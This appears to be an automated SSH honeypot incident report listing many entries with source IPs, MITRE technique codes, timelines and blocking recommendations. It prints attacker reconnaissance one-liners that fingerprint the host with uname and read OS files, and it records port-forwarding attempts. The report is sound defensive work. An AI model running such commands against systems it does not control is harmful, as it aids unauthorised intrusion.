| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:33:01` | `cowrie.session.connect` |
| `2026-07-09 20:33:01` | `cowrie.client.version` |
| `2026-07-09 20:33:01` | `cowrie.client.kex` |
| `2026-07-09 20:33:02` | `cowrie.login.success` |
| `2026-07-09 20:33:02` | `cowrie.session.params` |
| `2026-07-09 20:33:02` | `cowrie.command.input` |
| `2026-07-09 20:33:02` | `cowrie.command.input` |
| `2026-07-09 20:33:02` | `cowrie.command.input` |
| `2026-07-09 20:33:02` | `cowrie.command.input` |
| `2026-07-09 20:33:02` | `cowrie.command.input` |
| `2026-07-09 20:33:02` | `cowrie.command.success` |
| `2026-07-09 20:33:02` | `cowrie.command.input` |
| `2026-07-09 20:33:02` | `cowrie.command.input` |
| `2026-07-09 20:33:03` | `cowrie.command.input` |
| `2026-07-09 20:33:03` | `cowrie.command.input` |
| `2026-07-09 20:33:03` | `cowrie.log.closed` |
| `2026-07-09 20:33:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-470498922aff

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 20:34 |
| **Last Seen** | 2026-07-09 20:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:34:35` | `cowrie.session.connect` |
| `2026-07-09 20:34:35` | `cowrie.client.version` |
| `2026-07-09 20:34:35` | `cowrie.client.kex` |
| `2026-07-09 20:34:35` | `cowrie.login.success` |
| `2026-07-09 20:34:36` | `cowrie.session.params` |
| `2026-07-09 20:34:37` | `cowrie.command.input` |
| `2026-07-09 20:34:37` | `cowrie.command.input` |
| `2026-07-09 20:34:37` | `cowrie.command.input` |
| `2026-07-09 20:34:37` | `cowrie.command.input` |
| `2026-07-09 20:34:37` | `cowrie.command.input` |
| `2026-07-09 20:34:37` | `cowrie.command.success` |
| `2026-07-09 20:34:37` | `cowrie.command.input` |
| `2026-07-09 20:34:37` | `cowrie.command.input` |
| `2026-07-09 20:34:37` | `cowrie.command.input` |
| `2026-07-09 20:34:37` | `cowrie.command.input` |
| `2026-07-09 20:34:37` | `cowrie.log.closed` |
| `2026-07-09 20:34:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a39abc6d3e1

| Field | Detail |
|---|---|
| **Source IP** | `41.231.85[.]75` |
| **First Seen** | 2026-07-09 20:34 |
| **Last Seen** | 2026-07-09 20:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:34:59` | `cowrie.session.connect` |
| `2026-07-09 20:34:59` | `cowrie.client.version` |
| `2026-07-09 20:34:59` | `cowrie.client.kex` |
| `2026-07-09 20:35:00` | `cowrie.login.success` |
| `2026-07-09 20:35:00` | `cowrie.direct-tcpip.request` |
| `2026-07-09 20:35:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.231.85[.]75` to AbuseIPDB if not already reported
- [ ] Block `41.231.85[.]75` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cefced5b3120

| Field | Detail |
|---|---|
| **Source IP** | `61.12.86[.]90` |
| **First Seen** | 2026-07-09 20:35 |
| **Last Seen** | 2026-07-09 20:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:35:05` | `cowrie.session.connect` |
| `2026-07-09 20:35:06` | `cowrie.client.version` |
| `2026-07-09 20:35:06` | `cowrie.client.kex` |
| `2026-07-09 20:35:08` | `cowrie.login.success` |
| `2026-07-09 20:35:08` | `cowrie.direct-tcpip.request` |
| `2026-07-09 20:35:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.12.86[.]90` to AbuseIPDB if not already reported
- [ ] Block `61.12.86[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-820e4dcd4ff9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 20:36 |
| **Last Seen** | 2026-07-09 20:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:36:07` | `cowrie.session.connect` |
| `2026-07-09 20:36:07` | `cowrie.client.version` |
| `2026-07-09 20:36:07` | `cowrie.client.kex` |
| `2026-07-09 20:36:07` | `cowrie.login.success` |
| `2026-07-09 20:36:08` | `cowrie.session.params` |
| `2026-07-09 20:36:08` | `cowrie.command.input` |
| `2026-07-09 20:36:08` | `cowrie.command.input` |
| `2026-07-09 20:36:08` | `cowrie.command.input` |
| `2026-07-09 20:36:08` | `cowrie.command.input` |
| `2026-07-09 20:36:08` | `cowrie.command.input` |
| `2026-07-09 20:36:08` | `cowrie.command.success` |
| `2026-07-09 20:36:08` | `cowrie.command.input` |
| `2026-07-09 20:36:08` | `cowrie.command.input` |
| `2026-07-09 20:36:08` | `cowrie.command.input` |
| `2026-07-09 20:36:08` | `cowrie.command.input` |
| `2026-07-09 20:36:08` | `cowrie.log.closed` |
| `2026-07-09 20:36:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b825053b6b9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 20:37 |
| **Last Seen** | 2026-07-09 20:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:37:27` | `cowrie.session.connect` |
| `2026-07-09 20:37:27` | `cowrie.client.version` |
| `2026-07-09 20:37:27` | `cowrie.client.kex` |
| `2026-07-09 20:37:28` | `cowrie.login.success` |
| `2026-07-09 20:37:29` | `cowrie.session.params` |
| `2026-07-09 20:37:29` | `cowrie.command.input` |
| `2026-07-09 20:37:29` | `cowrie.command.input` |
| `2026-07-09 20:37:29` | `cowrie.command.input` |
| `2026-07-09 20:37:29` | `cowrie.command.input` |
| `2026-07-09 20:37:29` | `cowrie.command.input` |
| `2026-07-09 20:37:29` | `cowrie.command.success` |
| `2026-07-09 20:37:29` | `cowrie.command.input` |
| `2026-07-09 20:37:29` | `cowrie.command.input` |
| `2026-07-09 20:37:29` | `cowrie.command.input` |
| `2026-07-09 20:37:29` | `cowrie.command.input` |
| `2026-07-09 20:37:30` | `cowrie.log.closed` |
| `2026-07-09 20:37:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f5382f8c3c3

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 20:38 |
| **Last Seen** | 2026-07-09 20:38 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:38:02` | `cowrie.session.connect` |
| `2026-07-09 20:38:03` | `cowrie.client.version` |
| `2026-07-09 20:38:03` | `cowrie.client.kex` |
| `2026-07-09 20:38:08` | `cowrie.login.success` |
| `2026-07-09 20:38:13` | `cowrie.session.params` |
| `2026-07-09 20:38:13` | `cowrie.command.input` |
| `2026-07-09 20:38:14` | `cowrie.log.closed` |
| `2026-07-09 20:38:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fb2bb265aa3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 20:38 |
| **Last Seen** | 2026-07-09 20:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:38:44` | `cowrie.session.connect` |
| `2026-07-09 20:38:44` | `cowrie.client.version` |
| `2026-07-09 20:38:44` | `cowrie.client.kex` |
| `2026-07-09 20:38:45` | `cowrie.login.success` |
| `2026-07-09 20:38:46` | `cowrie.session.params` |
| `2026-07-09 20:38:46` | `cowrie.command.input` |
| `2026-07-09 20:38:46` | `cowrie.command.input` |
| `2026-07-09 20:38:46` | `cowrie.command.input` |
| `2026-07-09 20:38:46` | `cowrie.command.input` |
| `2026-07-09 20:38:46` | `cowrie.command.input` |
| `2026-07-09 20:38:46` | `cowrie.command.success` |
| `2026-07-09 20:38:46` | `cowrie.command.input` |
| `2026-07-09 20:38:46` | `cowrie.command.input` |
| `2026-07-09 20:38:46` | `cowrie.command.input` |
| `2026-07-09 20:38:46` | `cowrie.command.input` |
| `2026-07-09 20:38:46` | `cowrie.log.closed` |
| `2026-07-09 20:38:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c00655c93a4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 20:40 |
| **Last Seen** | 2026-07-09 20:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:40:00` | `cowrie.session.connect` |
| `2026-07-09 20:40:00` | `cowrie.client.version` |
| `2026-07-09 20:40:00` | `cowrie.client.kex` |
| `2026-07-09 20:40:01` | `cowrie.login.success` |
| `2026-07-09 20:40:02` | `cowrie.session.params` |
| `2026-07-09 20:40:02` | `cowrie.command.input` |
| `2026-07-09 20:40:02` | `cowrie.command.input` |
| `2026-07-09 20:40:02` | `cowrie.command.input` |
| `2026-07-09 20:40:02` | `cowrie.command.input` |
| `2026-07-09 20:40:02` | `cowrie.command.input` |
| `2026-07-09 20:40:02` | `cowrie.command.success` |
| `2026-07-09 20:40:02` | `cowrie.command.input` |
| `2026-07-09 20:40:02` | `cowrie.command.input` |
| `2026-07-09 20:40:02` | `cowrie.command.input` |
| `2026-07-09 20:40:02` | `cowrie.command.input` |
| `2026-07-09 20:40:02` | `cowrie.log.closed` |
| `2026-07-09 20:40:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12701480f1bb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 20:41 |
| **Last Seen** | 2026-07-09 20:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:41:17` | `cowrie.session.connect` |
| `2026-07-09 20:41:17` | `cowrie.client.version` |
| `2026-07-09 20:41:17` | `cowrie.client.kex` |
| `2026-07-09 20:41:18` | `cowrie.login.success` |
| `2026-07-09 20:41:19` | `cowrie.session.params` |
| `2026-07-09 20:41:19` | `cowrie.command.input` |
| `2026-07-09 20:41:19` | `cowrie.command.input` |
| `2026-07-09 20:41:19` | `cowrie.command.input` |
| `2026-07-09 20:41:19` | `cowrie.command.input` |
| `2026-07-09 20:41:19` | `cowrie.command.input` |
| `2026-07-09 20:41:19` | `cowrie.command.success` |
| `2026-07-09 20:41:19` | `cowrie.command.input` |
| `2026-07-09 20:41:19` | `cowrie.command.input` |
| `2026-07-09 20:41:19` | `cowrie.command.input` |
| `2026-07-09 20:41:19` | `cowrie.command.input` |
| `2026-07-09 20:41:20` | `cowrie.log.closed` |
| `2026-07-09 20:41:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d2736012b07

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 20:42 |
| **Last Seen** | 2026-07-09 20:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:42:39` | `cowrie.session.connect` |
| `2026-07-09 20:42:39` | `cowrie.client.version` |
| `2026-07-09 20:42:39` | `cowrie.client.kex` |
| `2026-07-09 20:42:39` | `cowrie.login.success` |
| `2026-07-09 20:42:40` | `cowrie.session.params` |
| `2026-07-09 20:42:40` | `cowrie.command.input` |
| `2026-07-09 20:42:40` | `cowrie.command.input` |
| `2026-07-09 20:42:40` | `cowrie.command.input` |
| `2026-07-09 20:42:40` | `cowrie.command.input` |
| `2026-07-09 20:42:40` | `cowrie.command.input` |
| `2026-07-09 20:42:40` | `cowrie.command.success` |
| `2026-07-09 20:42:40` | `cowrie.command.input` |
| `2026-07-09 20:42:40` | `cowrie.command.input` |
| `2026-07-09 20:42:40` | `cowrie.command.input` |
| `2026-07-09 20:42:40` | `cowrie.command.input` |
| `2026-07-09 20:42:40` | `cowrie.log.closed` |
| `2026-07-09 20:42:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84eddbbb8bc8

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-09 20:42 |
| **Last Seen** | 2026-07-09 20:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:42:43` | `cowrie.session.connect` |
| `2026-07-09 20:42:43` | `cowrie.client.version` |
| `2026-07-09 20:42:44` | `cowrie.client.kex` |
| `2026-07-09 20:42:44` | `cowrie.login.success` |
| `2026-07-09 20:42:44` | `cowrie.direct-tcpip.request` |
| `2026-07-09 20:42:44` | `cowrie.direct-tcpip.data` |
| `2026-07-09 20:42:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddef80e1ddf9

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-09 20:42 |
| **Last Seen** | 2026-07-09 20:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:42:45` | `cowrie.session.connect` |
| `2026-07-09 20:42:45` | `cowrie.client.version` |
| `2026-07-09 20:42:45` | `cowrie.client.kex` |
| `2026-07-09 20:42:46` | `cowrie.login.success` |
| `2026-07-09 20:42:47` | `cowrie.session.params` |
| `2026-07-09 20:42:47` | `cowrie.command.input` |
| `2026-07-09 20:42:47` | `cowrie.log.closed` |
| `2026-07-09 20:42:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1684a143a9f8

| Field | Detail |
|---|---|
| **Source IP** | `117.250.19[.]91` |
| **First Seen** | 2026-07-09 20:43 |
| **Last Seen** | 2026-07-09 20:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:43:00` | `cowrie.session.connect` |
| `2026-07-09 20:43:01` | `cowrie.client.version` |
| `2026-07-09 20:43:01` | `cowrie.client.kex` |
| `2026-07-09 20:43:03` | `cowrie.login.success` |
| `2026-07-09 20:43:04` | `cowrie.direct-tcpip.request` |
| `2026-07-09 20:43:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.250.19[.]91` to AbuseIPDB if not already reported
- [ ] Block `117.250.19[.]91` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3782e52c3b3d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 20:43 |
| **Last Seen** | 2026-07-09 20:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:43:57` | `cowrie.session.connect` |
| `2026-07-09 20:43:57` | `cowrie.client.version` |
| `2026-07-09 20:43:58` | `cowrie.client.kex` |
| `2026-07-09 20:43:58` | `cowrie.login.success` |
| `2026-07-09 20:43:59` | `cowrie.session.params` |
| `2026-07-09 20:43:59` | `cowrie.command.input` |
| `2026-07-09 20:43:59` | `cowrie.command.input` |
| `2026-07-09 20:43:59` | `cowrie.command.input` |
| `2026-07-09 20:43:59` | `cowrie.command.input` |
| `2026-07-09 20:43:59` | `cowrie.command.input` |
| `2026-07-09 20:43:59` | `cowrie.command.success` |
| `2026-07-09 20:43:59` | `cowrie.command.input` |
| `2026-07-09 20:43:59` | `cowrie.command.input` |
| `2026-07-09 20:43:59` | `cowrie.command.input` |
| `2026-07-09 20:43:59` | `cowrie.command.input` |
| `2026-07-09 20:43:59` | `cowrie.log.closed` |
| `2026-07-09 20:43:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bb22a747dea

| Field | Detail |
|---|---|
| **Source IP** | `139.59.45[.]165` |
| **First Seen** | 2026-07-09 20:43 |
| **Last Seen** | 2026-07-09 20:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
